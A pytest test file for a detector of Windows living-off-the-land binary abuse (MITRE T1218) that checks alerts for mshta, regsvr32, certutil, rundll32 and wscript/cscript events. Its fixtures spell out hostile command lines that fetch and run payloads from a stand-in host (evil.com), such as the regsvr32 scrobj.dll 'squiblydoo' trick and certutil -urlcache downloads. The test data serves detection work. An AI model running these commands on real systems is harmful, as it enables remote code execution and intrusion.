"""
Tests for shadow313.v4.detection.lolbin_detector — T1218
"""
from __future__ import annotations
import pytest
from shadow313.v4.detection.lolbin_detector import (
    LOLBinDetector, LOLBinAlert, LOLBIN_SIGNATURES,
    SUSPICIOUS_PARENT_PROCESSES, LEGITIMATE_PARENTS,
)


@pytest.fixture
def detector():
    return LOLBinDetector()


class TestLOLBinDetectorBasics:

    def test_instantiates(self, detector):
        assert detector is not None

    def test_list_lolbins(self):
        lolbins = LOLBinDetector.list_lolbins()
        assert len(lolbins) >= 10
        assert "mshta.exe" in lolbins
        assert "regsvr32.exe" in lolbins
        assert "certutil.exe" in lolbins

    def test_get_technique(self):
        assert LOLBinDetector.get_technique("mshta.exe") == "T1218.005"
        assert LOLBinDetector.get_technique("regsvr32.exe") == "T1218.010"
        assert LOLBinDetector.get_technique("rundll32.exe") == "T1218.011"

    def test_get_technique_unknown(self):
        assert LOLBinDetector.get_technique("notepad.exe") is None

    def test_clean_process_no_alert(self, detector):
        alert = detector.analyze_event({
            "process_name": "notepad.exe",
            "command_line": "notepad.exe C:\\file.txt",
            "parent_process": "explorer.exe",
        })
        assert alert is None

    def test_get_stats_empty(self, detector):
        stats = detector.get_stats()
        assert stats["total_alerts"] == 0

    def test_clear(self, detector):
        detector.analyze_event({"process_name": "mshta.exe", "command_line": "mshta.exe http://evil.com/x.hta", "parent_process": "explorer.exe"})
        detector.clear()
        assert len(detector.get_alerts()) == 0


class TestMshtaDetection:

    def test_mshta_remote_url(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/payload.hta",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.technique == "T1218.005"
        assert alert.lolbin == "mshta.exe"

    def test_mshta_vbscript(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": 'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd""",0,True)(window.close)',
            "parent_process": "winword.exe",
        })
        assert alert is not None
        assert alert.severity in ("CRITICAL", "HIGH")

    def test_mshta_javascript(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe javascript:a=(GetObject('script:http://evil.com/x.sct')).Exec();close();",
            "parent_process": "explorer.exe",
        })
        assert alert is not None

    def test_mshta_hta_file(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe C:\\Users\\user\\AppData\\Local\\Temp\\payload.hta",
            "parent_process": "outlook.exe",
        })
        assert alert is not None

    def test_mshta_office_parent_boosts_risk(self, detector):
        alert_office = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
            "parent_process": "winword.exe",
        })
        alert_explorer = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
            "parent_process": "explorer.exe",
        })
        assert alert_office.risk_score > alert_explorer.risk_score


class TestRegsvr32Detection:

    def test_squiblydoo(self, detector):
        alert = detector.analyze_event({
            "process_name": "regsvr32.exe",
            "command_line": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll",
            "parent_process": "cmd.exe",
        })
        assert alert is not None
        assert alert.technique == "T1218.010"

    def test_regsvr32_remote_sct(self, detector):
        alert = detector.analyze_event({
            "process_name": "regsvr32.exe",
            "command_line": "regsvr32.exe /i:http://evil.com/x.sct scrobj.dll",
            "parent_process": "explorer.exe",
        })
        assert alert is not None

    def test_regsvr32_clean(self, detector):
        alert = detector.analyze_event({
            "process_name": "regsvr32.exe",
            "command_line": "regsvr32.exe /s C:\\Windows\\System32\\shell32.dll",
            "parent_process": "msiexec.exe",
        })
        assert alert is None


class TestCertutilDetection:

    def test_certutil_urlcache(self, detector):
        alert = detector.analyze_event({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
            "parent_process": "cmd.exe",
        })
        assert alert is not None

    def test_certutil_decode(self, detector):
        alert = detector.analyze_event({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -decode encoded.b64 output.exe",
            "parent_process": "powershell.exe",
        })
        assert alert is not None

    def test_certutil_clean(self, detector):
        alert = detector.analyze_event({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -verify certificate.cer",
            "parent_process": "explorer.exe",
        })
        assert alert is None


class TestRundll32Detection:

    def test_rundll32_javascript(self, detector):
        alert = detector.analyze_event({
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/x.sct\")",
            "parent_process": "explorer.exe",
        })
        assert alert is not None
        assert alert.technique == "T1218.011"

    def test_rundll32_url_handler(self, detector):
        alert = detector.analyze_event({
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe url.dll,FileProtocolHandler http://evil.com",
            "parent_process": "cmd.exe",
        })
        assert alert is not None

    def test_rundll32_temp_dll(self, detector):
        alert = detector.analyze_event({
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe C:\\temp\\evil.dll,EntryPoint",
            "parent_process": "explorer.exe",
        })
        assert alert is not None


class TestWscriptCscriptDetection:

    def test_wscript_remote(self, detector):
        alert = detector.analyze_event({
            "process_name": "wscript.exe",
            "command_line": "wscript.exe http://evil.com/payload.vbs",
            "parent_process": "explorer.exe",
        })
        assert alert is not None

    def test_cscript_vbs(self, detector):
        alert = detector.analyze_event({
            "process_name": "cscript.exe",
            "command_line": "cscript.exe C:\\Users\\user\\AppData\\Local\\Temp\\payload.vbs",
            "parent_process": "outlook.exe",
        })
        assert alert is not None

    def test_wscript_engine_spec(self, detector):
        alert = detector.analyze_event({
            "process_name": "wscript.exe",
            "command_line": "wscript.exe //e:vbscript payload.txt",
            "parent_process": "cmd.exe",
        })
        assert alert is not None


class TestAlertProperties:

    def test_alert_has_all_fields(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
            "parent_process": "winword.exe",
        })
        assert alert is not None
        assert hasattr(alert, 'lolbin')
        assert hasattr(alert, 'technique')
        assert hasattr(alert, 'risk_score')
        assert hasattr(alert, 'severity')
        assert hasattr(alert, 'description')
        assert hasattr(alert, 'recommendations')
        assert hasattr(alert, 'timestamp')

    def test_alert_to_dict(self, detector):
        alert = detector.analyze_event({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -f http://evil.com/x.exe",
            "parent_process": "cmd.exe",
        })
        d = alert.to_dict()
        assert isinstance(d, dict)
        assert "technique" in d
        assert "risk_score" in d

    def test_risk_score_bounded(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
            "parent_process": "winword.exe",
        })
        assert 0.0 <= alert.risk_score <= 1.0

    def test_severity_values(self, detector):
        alert = detector.analyze_event({
            "process_name": "mshta.exe",
            "command_line": "mshta.exe http://evil.com/x.hta",
            "parent_process": "winword.exe",
        })
        assert alert.severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW")

    def test_recommendations_not_empty(self, detector):
        alert = detector.analyze_event({
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -f http://evil.com/x.exe",
            "parent_process": "cmd.exe",
        })
        assert len(alert.recommendations) > 0

    def test_analyze_batch(self, detector):
        events = [
            {"process_name": "mshta.exe", "command_line": "mshta.exe http://evil.com/x.hta", "parent_process": "winword.exe"},
            {"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://evil.com/x.exe", "parent_process": "cmd.exe"},
            {"process_name": "notepad.exe", "command_line": "notepad.exe", "parent_process": "explorer.exe"},
        ]
        alerts = detector.analyze_batch(events)
        assert len(alerts) == 2

    def test_get_stats_after_detections(self, detector):
        detector.analyze_event({"process_name": "mshta.exe", "command_line": "mshta.exe http://evil.com/x.hta", "parent_process": "winword.exe"})
        detector.analyze_event({"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -f http://evil.com/x.exe", "parent_process": "cmd.exe"})
        stats = detector.get_stats()
        assert stats["total_alerts"] == 2
        assert len(stats["lolbins_seen"]) == 2